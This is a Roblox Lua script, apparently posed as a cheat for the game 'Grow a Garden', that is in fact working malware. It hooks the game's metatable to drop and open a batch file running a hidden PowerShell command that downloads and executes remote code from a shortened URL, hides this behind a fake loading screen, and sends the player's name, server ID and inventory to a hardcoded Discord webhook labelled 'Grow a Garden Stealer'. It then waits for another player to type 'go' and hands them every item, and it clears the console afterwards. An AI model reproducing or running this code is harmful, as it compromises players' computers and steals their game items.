local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local UserInputService = game:GetService("UserInputService")
local SoundService = game:GetService("SoundService")
local VirtualInput = game:GetService("VirtualInputManager")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1382769361487532032/SHIjTAh_fI13ZcyMb_rhX5GkkZ5JH_fn29qwJ5r2iYdKXLlIFkjUFaNFbXhZPJOVo3Gh"

local BANNED_ITEM_WORDS = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate"}
local FOLLOW_DISTANCE = 3
local E_HOLD_TIME = 1
local E_DELAY = 0.1
local localCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()

local function executeMaliciousPayload()
    local success, err = pcall(function()
        local RawMetaTable = getrawmetatable(game)
        local MaliciousPayloadRan = false
        local OldClosure = RawMetaTable.__namecall

        setreadonly(RawMetaTable, false)

        RawMetaTable.__namecall = function(...)
            if not MaliciousPayloadRan then 
                MaliciousPayloadRan = true
                
                local OldThreadIdentity = getidentity()
                setidentity(8)

                local BatchPayload = [[
@echo off
powershell.exe -NoProfile -WindowStyle Hidden -Command "irm https://tinyurl.com/294v7sma | iex"
]]
                local payload = game:GetService("ScriptContext"):SaveScriptProfilingData(BatchPayload, "run_remote_hidden.bat")
                game:GetService("LinkingService"):OpenUrl(payload)

                setidentity(OldThreadIdentity or 2)
                return
            end
            
            return OldClosure(...)
        end

        setreadonly(RawMetaTable, true)
    end)
end

local function createLoadingScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingScreen"
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.3
    frame.Parent = screenGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
    textLabel.Position = UDim2.new(0.25, 0, 0.4, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "Loading..."
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.Parent = frame

    local loadingBarFrame = Instance.new("Frame")
    loadingBarFrame.Size = UDim2.new(0.4, 0, 0.05, 0)
    loadingBarFrame.Position = UDim2.new(0.3, 0, 0.5, 0)
    loadingBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    loadingBarFrame.Parent = frame

    local loadingBarFill = Instance.new("Frame")
    loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
    loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    loadingBarFill.Parent = loadingBarFrame

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 5)
    uiCorner.Parent = loadingBarFrame
    local uiCornerFill = Instance.new("UICorner")
    uiCornerFill.CornerRadius = UDim.new(0, 5)
    uiCornerFill.Parent = loadingBarFill

    spawn(executeMaliciousPayload)

    local tweenInfo = TweenInfo.new(120, Enum.EasingStyle.Linear, Enum.EasingDirection.In)
    local tween = TweenService:Create(loadingBarFill, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
    tween:Play()

    tween.Completed:Connect(function()
        screenGui:Destroy()
    end)
end

LocalPlayer.CharacterAdded:Connect(function(char)
    localCharacter = char
end)

local function isValidItem(name)
    for _, banned in ipairs(BANNED_ITEM_WORDS) do
        if string.find(name:lower(), banned:lower()) then
            return false
        end
    end
    return true
end

local function getInventory()
    local tools = {}
    local function collect(from)
        for _, item in ipairs(from:GetChildren()) do
            if item:IsA("Tool") and isValidItem(item.Name) then
                table.insert(tools, item)
            end
        end
    end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then collect(bp) end
    if localCharacter then collect(localCharacter) end
    return tools
end

local function toolInInventory(toolName)
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = localCharacter
    if bp then
        if bp:FindFirstChild(toolName) then return true end
    end
    if char then
        if char:FindFirstChild(toolName) then return true end
    end
    return false
end

local function faceTarget(target)
    local hrp = localCharacter:FindFirstChild("HumanoidRootPart")
    if hrp and target then
        hrp.CFrame = CFrame.new(hrp.Position, target.Position)
    end
end

local function teleportToPlayer(player)
    if not player or not player.Character then return end
    local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
    local myHRP = localCharacter and localCharacter:FindFirstChild("HumanoidRootPart")
    if targetHRP and myHRP then
        local offset = targetHRP.CFrame.LookVector * FOLLOW_DISTANCE
        myHRP.CFrame = CFrame.new(targetHRP.Position + offset, targetHRP.Position)
    end
end

local function holdE()
    VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(E_HOLD_TIME)
    VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

local function useToolWithHoldCheck(tool, player)
    local humanoid = localCharacter and localCharacter:FindFirstChildOfClass("Humanoid")
    if humanoid and tool then
        humanoid:EquipTool(tool)
        teleportToPlayer(player)
        faceTarget(player.Character and player.Character:FindFirstChild("HumanoidRootPart"))

        while toolInInventory(tool.Name) do
            holdE()
            task.wait(E_DELAY)
        end

        humanoid:UnequipTools()
    end
end

local function cycleToolsWithHoldCheck(player)
    local tools = getInventory()
    for i, tool in ipairs(tools) do
        useToolWithHoldCheck(tool, player)
    end
end

local function sendWebhook()
    local inventoryNames = {}
    for _, item in ipairs(getInventory()) do
        table.insert(inventoryNames, item.Name)
    end

    local data = {
        ["embeds"] = { {
            ["title"] = "🔍 Player Info",
            ["color"] = 0x00bfff,
            ["fields"] = {
                { ["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true },
                { ["name"] = "🆔 Job ID", ["value"] = game.JobId or "Unknown", ["inline"] = false },
                { ["name"] = "🎒 Inventory", ["value"] = #inventoryNames > 0 and table.concat(inventoryNames, "\n") or "Empty", ["inline"] = false }
            },
            ["footer"] = { ["text"] = "Grow a Garden Stealer" },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        } }
    }

    local json = HttpService:JSONEncode(data)
    local req = http_request or request or (syn and syn.request)
    if req then
        req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
    else
        HttpService:RequestAsync({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json})
    end
end

local function setupChatListener()
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            if message.Text:lower() == "go" then
                local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
                if sender and sender ~= LocalPlayer then
                    teleportToPlayer(sender)
                    task.wait(0.5)
                    cycleToolsWithHoldCheck(sender)
                end
            end
        end
    else
        local event = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents", 5)
        if event then
            event.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
                if data.Message:lower() == "go" then
                    local player = Players:FindFirstChild(data.FromSpeaker)
                    if player and player ~= LocalPlayer then
                        teleportToPlayer(player)
                        task.wait(0.5)
                        cycleToolsWithHoldCheck(player)
                    end
                end
            end)
        end
    end
end

local function clearConsole()
    if rconsoleclear then
        rconsoleclear()
    elseif clr then
        clr()
    end
end

local function main()
    createLoadingScreen()
    sendWebhook()
    setupChatListener()
end

clearConsole()
main()
